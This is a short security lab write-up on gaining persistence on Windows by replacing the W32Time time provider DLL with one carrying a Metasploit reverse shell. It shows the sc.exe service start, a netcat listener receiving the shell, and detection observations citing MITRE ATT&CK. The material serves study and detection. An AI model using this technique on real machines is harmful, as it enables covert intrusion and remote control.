---
description: Persistence
---

# Hijacking Time Providers

## Hijacking Time Providers

### Execution

Service w32time depends on the DLL specified in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.

If an attacker can replace the `w32time.dll` with his malicious DLL or modify the DllName value to point to his malicious binary, he can get that malicious code executed.

In this lab, we will just swap out the `w32time.dll` with our own. It contains a metasploit reverse shell payload:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3taO2t8RRXV8wmpY5%2F-LJ3ubBXuy1cRWHbO_DO%2Ftime-registry.png?alt=media\&token=2daa21ca-5638-489b-b510-cc12fee01fee)

Starting the w32time service:

```csharp
C:\Users\mantvydas\Start Menu\Programs\Startup>sc.exe start w32time

SERVICE_NAME: w32time
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 964
        FLAGS              :
```

Attacker receiving a reverse shell:

{% code title="attacker\@local" %}
```csharp
root@~# nc -lvvp 443
listening on [any] 443 ...
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 64634
```
{% endcode %}

### Observations

The shell is running as a child of svchost which is expected as this is where all the services originate from:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3taO2t8RRXV8wmpY5%2F-LJ3ubBQDk_u9pkSyqkC%2Ftime-ancestry.png?alt=media\&token=0f6ba9f1-ef44-4ad7-a582-74b9947c2eaa)

Note that the code is running under the context of `LOCAL SERVICE`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3taO2t8RRXV8wmpY5%2F-LJ3vkdI93JrpdwP4kLQ%2Ftime-context.png?alt=media\&token=61559838-e215-4768-91b3-02d110b704df)

This time and time again shows that binaries running off of svchost.exe, especially if they are rundll32 and are making network connections, should be investigated further.

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1209" %}
